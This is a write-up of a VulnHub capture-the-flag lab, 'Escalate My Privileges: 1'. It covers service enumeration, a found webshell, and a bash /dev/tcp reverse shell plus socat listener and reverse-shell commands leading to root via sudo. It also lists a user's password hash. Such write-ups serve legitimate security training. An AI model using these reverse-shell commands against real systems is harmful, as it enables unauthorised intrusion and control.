# Target: VulnHub – Escalate My Privileges: 1

## Engagement Overview
**Target:** Escalate My Privileges (VulnHub)  
**Box IP:** 192.168.56.105

---

### Objectives
- Perform enumeration of open services
- Identify and access webshell
- Gain reverse shell and elevate privileges to root
- Practice stable shell upgrades
- Document privilege escalation path and operational flow

---

## Service Enumeration

**Ports Open:**  
- 22/tcp – OpenSSH 7.4  
- 80/tcp – Apache 2.4.6 (CentOS), PHP 5.4.16  

**Web Discoveries:**  
- `/phpbash.php` webshell found via `robots.txt`

---

## Methodologies

- Manual Nmap scanning and web fuzzing
- Used reverse shell from webshell to gain access
- Parsed local files for credentials
- Upgraded shell to full interactive session via `socat`

---

## Initial Access

**Vector:** Webshell (`/phpbash.php`) → Reverse Shell

**Command Used:**
```bash
bash -c 'bash -i >& /dev/tcp/192.168.56.10/6969 0>&1'
```

**User Discovered:** `armour`  
**Credentials Found:**  
`/home/armour/Credentials.txt`  
Password hash: `b7bc8489abe360486b4b19dbc242e885`

**Shell Context:** User shell with limited terminal functionality

---

## Privilege Escalation

**Method Used:**  
- Spawned full interactive TTY shell with `socat`:
```bash
# On Kali
socat file:`tty`,raw,echo=0 tcp-listen:6969

# On Target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<kali_ip>:6969
```

**Result:** Stable shell with job control and sudo access

**Command:**  
```bash
sudo -i
```

**Privilege Level Achieved:** `root`

---

## House Cleaning

- Verified shell stability
- No post-ex cleanup necessary (educational target)
- All commands used were non-destructive

---

## Post-Exploitation

**Tools Utilized**
* Nmap
* Netcat
* Python (basic PTY attempts)
* Socat (final interactive upgrade)
* Manual inspection and enumeration tools

---

## Key Takeaways

* Default PTY upgrades can fail in constrained environments
* `socat` provides reliable shell stability with full TTY features
* Always validate sudo configuration post-access
* Credential discovery in home dirs is common and often overlooked
* One good shell is only as useful as your ability to control and maintain it
* This box was simple, but still educational — initial webshell usage and shell stabilization were both areas of growth
* Even easy boxes can yield important lessons when approached with deliberate intent

---

### Status: COMPLETED
